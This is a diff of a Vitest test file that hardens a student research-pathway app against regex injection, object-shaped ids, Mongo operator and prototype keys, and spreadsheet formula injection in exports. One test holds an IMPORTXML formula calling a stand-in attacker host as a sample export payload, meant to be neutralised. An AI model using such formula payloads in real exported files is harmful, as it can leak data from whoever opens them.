@@ -1,9 +1,13 @@
 import { describe, expect, it } from 'vitest';
+import mongoose from 'mongoose';
 import {
+  MAX_SAVED_PATHWAY_NOTE_LENGTH,
   buildCaseInsensitiveNetidFilter,
   buildSavedPathwayPlanUnsetForIds,
   buildSavedPathwayPlansExport,
+  normalizeObjectIdStringForUserMutation,
   normalizeObjectIdsForUserMutation,
+  normalizeUserLookupObjectId,
   pruneSavedPathwayPlansForExistingPathways,
   sanitizeSavedPathwayPlanForStorage,
   type SavedPathwayPlanInput,
@@ -48,14 +52,17 @@ const pathway = (overrides: Partial<PathwaySearchHit> = {}): PathwaySearchHit =>
 });
 
 describe('buildCaseInsensitiveNetidFilter', () => {
-  it('escapes netid regex metacharacters before exact case-insensitive lookup', () => {
-    const filter = buildCaseInsensitiveNetidFilter('.*+$[x]');
-    const pattern = filter.netid.$regex;
-    const regex = new RegExp(pattern, filter.netid.$options);
+  it('rejects malformed netids before building regex filters', () => {
+    expect(() => buildCaseInsensitiveNetidFilter('.*+$[x]')).toThrow(/Invalid netid/);
+    expect(() => buildCaseInsensitiveNetidFilter('a'.repeat(4096))).toThrow(/Invalid netid/);
+  });
 
-    expect(pattern).toBe('^\\.\\*\\+\\$\\[x\\]$');
-    expect(regex.test('.*+$[x]')).toBe(true);
-    expect(regex.test('abc123')).toBe(false);
+  it('rejects object-shaped netids without invoking arbitrary toString', () => {
+    const objectNetid = {
+      toString: () => 'aa123',
+    };
+
+    expect(() => buildCaseInsensitiveNetidFilter(objectNetid)).toThrow(/Invalid netid/);
   });
 
   it('preserves case-insensitive exact netid matching', () => {
@@ -64,6 +71,23 @@ describe('buildCaseInsensitiveNetidFilter', () => {
 
     expect(regex.test('aa123')).toBe(true);
     expect(regex.test('xaa123')).toBe(false);
+  });
+});
+
+describe('normalizeUserLookupObjectId', () => {
+  it('accepts string and ObjectId account lookup ids', () => {
+    const id = '665f0b0c0b0c0b0c0b0c0b0c';
+
+    expect(normalizeUserLookupObjectId(id)).toBe(id);
+    expect(normalizeUserLookupObjectId(new mongoose.Types.ObjectId(id))).toBe(id);
+  });
+
+  it('rejects object-shaped account lookup ids without invoking arbitrary toString', () => {
+    expect(
+      normalizeUserLookupObjectId({
+        toString: () => '665f0b0c0b0c0b0c0b0c0b0c',
+      }),
+    ).toBeNull();
   });
 });
 
@@ -97,7 +121,7 @@ describe('sanitizeSavedPathwayPlanForStorage', () => {
     const result = sanitizeSavedPathwayPlanForStorage({
       intent: 'mass-email',
       stage: 'ready',
-      note: `${'a'.repeat(5001)}`,
+      note: `${'a'.repeat(MAX_SAVED_PATHWAY_NOTE_LENGTH + 1)}`,
       checklist: {
         'review-evidence': true,
         'bad-value': 'yes',
@@ -107,7 +131,7 @@ describe('sanitizeSavedPathwayPlanForStorage', () => {
 
     expect(result.intent).toBe('later');
     expect(result.stage).toBe('ready');
-    expect(result.note).toHaveLength(5000);
+    expect(result.note).toHaveLength(MAX_SAVED_PATHWAY_NOTE_LENGTH);
     expect(result.checklist).toEqual({
       'review-evidence': true,
       'bad-value': false,
@@ -127,6 +151,27 @@ describe('sanitizeSavedPathwayPlanForStorage', () => {
     expect(result.checklist).not.toHaveProperty('task-50');
   });
 
+  it('ignores non-object saved pathway checklists before storage', () => {
+    const result = sanitizeSavedPathwayPlanForStorage({
+      checklist: ['email-pi', 'draft-note'] as any,
+    });
+
+    expect(result.checklist).toEqual({});
+  });
+
+  it('stops reading saved pathway checklist keys after the storage cap', () => {
+    const result = sanitizeSavedPathwayPlanForStorage({
+      checklist: Object.fromEntries(
+        Array.from({ length: 10_000 }, (_, index) => [`task-${index}`, true]),
+      ),
+    });
+
+    expect(Object.keys(result.checklist)).toHaveLength(50);
+    expect(result.checklist).toHaveProperty('task-0', true);
+    expect(result.checklist).toHaveProperty('task-49', true);
+    expect(result.checklist).not.toHaveProperty('task-9999');
+  });
+
   it('drops oversized saved pathway checklist keys before storage', () => {
     const result = sanitizeSavedPathwayPlanForStorage({
       checklist: {
@@ -136,6 +181,24 @@ describe('sanitizeSavedPathwayPlanForStorage', () => {
     });
 
     expect(result.checklist).toEqual({ 'review-evidence': true });
+  });
+
+  it('normalizes saved pathway checklist keys before storage', () => {
+    const result = sanitizeSavedPathwayPlanForStorage({
+      checklist: {
+        ' review.evidence ': true,
+        '$set': true,
+        constructor: true,
+        prototype: true,
+      },
+    });
+
+    expect(result.checklist).toEqual({
+      review_evidence: true,
+      _set: true,
+    });
+    expect(Object.prototype.hasOwnProperty.call(result.checklist, 'constructor')).toBe(false);
+    expect(Object.prototype.hasOwnProperty.call(result.checklist, 'prototype')).toBe(false);
   });
 });
 
@@ -154,6 +217,14 @@ describe('buildSavedPathwayPlanUnsetForIds', () => {
 });
 
 describe('normalizeObjectIdsForUserMutation', () => {
+  it('normalizes ObjectId instances without falling back to arbitrary object coercion', () => {
+    const objectId = new mongoose.Types.ObjectId('665f0b0c0b0c0b0c0b0c0b0c');
+
+    expect(normalizeObjectIdStringForUserMutation(objectId, 'favPathways')).toBe(
+      '665f0b0c0b0c0b0c0b0c0b0c',
+    );
+  });
+
   it('normalizes valid ObjectId strings for account mutations', () => {
     const result = normalizeObjectIdsForUserMutation(
       ['665f0b0c0b0c0b0c0b0c0b0c'],
@@ -161,6 +232,22 @@ describe('normalizeObjectIdsForUserMutation', () => {
     );
 
     expect(result.map((id) => id.toString())).toEqual(['665f0b0c0b0c0b0c0b0c0b0c']);
+  });
+
+  it('rejects arbitrary object-shaped ids instead of invoking toString', () => {
+    const objectIdLike = {
+      toString: () => '665f0b0c0b0c0b0c0b0c0b0c',
+    };
+
+    expect(() => normalizeObjectIdsForUserMutation([objectIdLike], 'favListings')).toThrow(
+      /Invalid favListings id/,
+    );
+  });
+
+  it('rejects non-array account mutation batches before per-id work', () => {
+    expect(() => normalizeObjectIdsForUserMutation({ 0: '665f0b0c0b0c0b0c0b0c0b0c' } as any, 'favListings')).toThrow(
+      /Invalid favListings ids/,
+    );
   });
 
   it('rejects malformed ids before they reach Mongo update paths', () => {
@@ -258,6 +345,66 @@ describe('buildSavedPathwayPlansExport', () => {
 
     expect(result.privacy.includesPrivateNotes).toBe(true);
     expect(result.items[0].privateNote).toBe('Bring this to advising.');
+  });
+
+  it('neutralizes formula-like strings in saved plan exports', () => {
+    const result = buildSavedPathwayPlansExport(
+      [
+        pathway({
+          studentFacingLabel: '=IMPORTXML("https://attacker.invalid","//a")',
+          researchEntity: {
+            _id: '665f0b0c0b0c0b0c0b0c0b0d',
+            slug: 'climate-archive',
+            name: '+cmd',
+            displayName: '@hidden',
+            departments: ['History'],
+            researchAreas: ['Environmental history'],
+          },
+        }),
+      ],
+      {
+        '665f0b0c0b0c0b0c0b0c0b0c': {
+          note: '-run command',
+          checklist: {
+            '=callout': true,
+          },
+        },
+      },
+      {
+        includePrivateNotes: true,
+      },
+    );
+
+    expect(result.items[0].title).toBe('\'=IMPORTXML("https://attacker.invalid","//a")');
+    expect(result.items[0].researchEntity.name).toBe("'@hidden");
+    expect(result.items[0].privateNote).toBe("'-run command");
+    expect(result.items[0].checklist).toEqual({ "'=callout": true });
+  });
+
+  it('redacts direct contact details from exported system-derived labels', () => {
+    const result = buildSavedPathwayPlansExport(
+      [
+        pathway({
+          studentFacingLabel: 'Email lab-manager@yale.edu or call 203-555-1212',
+          researchEntity: {
+            _id: '665f0b0c0b0c0b0c0b0c0b0d',
+            slug: 'climate-archive',
+            name: 'Climate Archive contact archive@example.edu',
+            displayName: 'Climate Archive 203-555-0000',
+            departments: ['History'],
+            researchAreas: ['Environmental history'],
+          },
+        }),
+      ],
+      {},
+    );
+
+    expect(result.items[0].title).toBe('Email [email redacted] or call [phone redacted]');
+    expect(result.items[0].researchEntity.name).toBe('Climate Archive [phone redacted]');
+    expect(result.privacy.includesNonPublicContactEmails).toBe(false);
+    expect(JSON.stringify(result)).not.toContain('lab-manager@yale.edu');
+    expect(JSON.stringify(result)).not.toContain('archive@example.edu');
+    expect(JSON.stringify(result)).not.toContain('203-555');
   });
 
   it('defaults missing plans to a student-facing intent from the pathway action', () => {
